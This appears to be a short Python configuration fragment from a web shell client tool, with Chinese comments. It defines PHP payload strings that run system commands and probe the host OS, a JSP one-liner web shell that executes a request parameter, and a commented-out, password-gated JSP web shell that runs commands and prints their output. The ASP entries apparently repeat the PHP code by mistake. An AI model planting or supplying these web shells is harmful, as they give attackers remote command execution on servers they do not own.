
PHP_shellBaseCode='''echo "\n目标主机系统:";echo php_uname('s');'''
PHP_shellCode='''@@system("##");'''


##<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>  jsp一句话客户端
JSP_shellBaseCode='''uname'''
JSP_shellCode='''shell'''
# <%
#     if("023".equals(request.getParameter("pwd"))){
#         java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
#         int a = -1;
#         byte[] b = new byte[2048];
#         out.print("<pre>");
#         while((a=in.read(b))!=-1){
#             out.println(new String(b));
#         }
#         out.print("</pre>");
#     }
# %>



ASP_shellBaseCode='''echo "\n目标主机系统:";echo php_uname('s');'''
ASP_shellCode='''@@system("##");'''